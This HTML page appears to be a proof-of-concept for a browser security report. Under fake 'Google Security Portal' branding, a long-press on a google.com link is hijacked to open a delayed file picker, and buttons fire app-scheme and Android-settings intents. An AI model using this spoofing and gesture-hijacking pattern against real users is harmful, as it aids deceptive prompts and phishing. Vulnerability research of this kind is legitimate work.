<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Picker & Multi-Vector S1/P1 Security PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 15px;
        }
        .section-title {
            font-size: 12px;
            font-weight: 700;
            color: #5f6368;
            margin: 15px 0 8px 0;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .button-grid {
            display: flex;
            flex-direction: column;
            gap: 8px;
            width: 100%;
            max-width: 360px;
        }
        a.spoof-link, button.spoof-btn {
            display: block;
            color: white;
            padding: 11px 16px;
            text-decoration: none;
            font-weight: 600;
            font-size: 13px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.12);
            transition: opacity 0.2s, background-color 0.2s;
        }
        a.spoof-link:active, button.spoof-btn:active {
            opacity: 0.75;
        }
        .bg-primary { background-color: #1a73e8; }
        .bg-google { background-color: #ffffff; color: #3c4043; border: 1px solid #dadce0; }
        .bg-green { background-color: #34a853; }
        .bg-red { background-color: #ea4335; }
        .bg-yellow { background-color: #fbbc05; color: #202124; }
        .bg-purple { background-color: #9334e6; }
        .bg-dark { background-color: #202124; }

        .preview-container {
            margin-top: 20px;
            max-width: 280px;
            display: none;
        }
        .preview-container img {
            width: 100%;
            border-radius: 8px;
            border: 1px solid #dadce0;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
        }
        .file-info {
            margin-top: 8px;
            font-size: 12px;
            color: #5f6368;
            word-break: break-all;
        }
        .status-console {
            margin-top: 15px;
            font-family: monospace;
            font-size: 11px;
            background: #e8eaed;
            color: #202124;
            padding: 8px 12px;
            border-radius: 6px;
            max-width: 360px;
            width: 100%;
            box-sizing: border-box;
            text-align: left;
            word-break: break-all;
        }
        .footer-note {
            margin-top: 25px;
            font-size: 11px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal - S1/P1 Lab Suite</div>
    <h1>Secure Document & Vector Verification</h1>

    <div class="button-grid">
        <!-- 1. Vektor Utama: File Picker & Google Navigation / Ephemeral Tab -->
        <a href="https://google.com" class="spoof-link bg-primary" id="targetLink">1. Open New Window & Upload Photo</a>

        <div class="section-title">Google Integration Vectors</div>
        <button class="spoof-btn bg-google" onclick="openGooglePopup()">Open Google.com in Popup Window</button>
        <button class="spoof-btn bg-google" onclick="redirectNavToGoogle()">Seamless Location Redirect to Google</button>

        <div class="section-title">App Schemes & Deep Linking</div>
        <button class="spoof-btn bg-purple" onclick="triggerAppScheme('instagram://app')">Open Instagram Intent</button>
        <button class="spoof-btn bg-green" onclick="triggerAppScheme('geo:0,0?q=Googleplex')">Open Google Maps Intent</button>
        <button class="spoof-btn bg-red" onclick="triggerAppScheme('geo:halo')">Open Geo Custom Scheme (geo:halo)</button>
        <button class="spoof-btn bg-dark" onclick="triggerAppScheme('whatsapp://send?text=S1_P1_PoC_Test')">Open WhatsApp Intent</button>

        <div class="section-title">Android System Intents</div>
        <button class="spoof-btn bg-yellow" onclick="triggerAndroidIntent('android.settings.BLUETOOTH_SETTINGS')">Open Bluetooth Settings Intent</button>
        <button class="spoof-btn bg-yellow" onclick="triggerAndroidIntent('android.settings.WIFI_SETTINGS')">Open Wi-Fi Settings Intent</button>
        <button class="spoof-btn bg-yellow" onclick="triggerAndroidIntent('android.settings.LOCATION_SOURCE_SETTINGS')">Open Location Settings Intent</button>
        <button class="spoof-btn bg-yellow" onclick="triggerAndroidIntent('android.settings.NFC_SETTINGS')">Open NFC Settings Intent</button>
    </div>

    <!-- Uploaded Image Preview Box -->
    <div class="preview-container" id="previewBox">
        <img id="imagePreview" src="" alt="File Preview">
        <div class="file-info" id="fileInfo"></div>
    </div>

    <!-- Live Status Console -->
    <div class="status-console" id="statusConsole">Status: Ready. Awaiting user interaction...</div>

    <div class="footer-note">Authorized S1/P1 vulnerability research environment.</div>

    <script>
        let triggered = false;

        function logStatus(message) {
            const consoleEl = document.getElementById("statusConsole");
            consoleEl.innerText = `Status: ${message}`;
            console.debug(message);
        }

        // Logika Utama PoC: File Picker Attack Vector
        const executeAttackVector = () => {
            if (triggered) return;
            triggered = true;
            logStatus("Executing File Picker vector sequence...");

            setTimeout(async () => {
                try {
                    const [fileHandle] = await window.showOpenFilePicker({
                        multiple: false,
                        types: [{
                            description: 'Images & Documents',
                            accept: { 
                                'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
                                'application/pdf': ['.pdf']
                            }
                        }]
                    });

                    const file = await fileHandle.getFile();
                    document.getElementById("fileInfo").innerText = `Selected file: ${file.name}`;
                    logStatus(`File successfully accessed: ${file.name}`);

                    const previewBox = document.getElementById("previewBox");
                    const imagePreview = document.getElementById("imagePreview");
                    
                    if (file.type.startsWith('image/')) {
                        imagePreview.src = URL.createObjectURL(file);
                        previewBox.style.display = "block";
                    } else {
                        imagePreview.src = "";
                        previewBox.style.display = "block";
                    }

                } catch (err) {
                    logStatus(`File picker cancelled or blocked: ${err.message}`);
                } finally {
                    setTimeout(() => { triggered = false; }, 900);
                }
            }, 1300);
        };

        // Event listener utama untuk target link (Mendukung aksi klik kanan / long-press & navigasi Google.com)
        const targetElement = document.getElementById("targetLink");

        targetElement.addEventListener("contextmenu", (e) => {
            e.preventDefault();
            executeAttackVector();
        });

        targetElement.addEventListener("touchstart", () => {
            logStatus("Touchstart event detected on target link.");
        }, { passive: true });

        // Handler Fungsi Vektor Tambahan
        function openGooglePopup() {
            logStatus("Attempting to open Google.com popup window...");
            const win = window.open("https://www.google.com", "_blank", "width=600,height=600");
            if (!win) {
                logStatus("Popup blocked by browser policy.");
            }
        }

        function redirectNavToGoogle() {
            logStatus("Initiating location redirect to https://google.com...");
            window.location.href = "https://google.com";
        }

        function triggerAppScheme(schemeUri) {
            logStatus(`Triggering custom scheme/intent: ${schemeUri}`);
            window.location.href = schemeUri;
        }

        function triggerAndroidIntent(actionName) {
            const intentUrl = `intent:#Intent;action=${actionName};end;`;
            logStatus(`Triggering Android Intent: ${actionName}`);
            window.location.href = intentUrl;
        }
    </script>

</body>
</html>
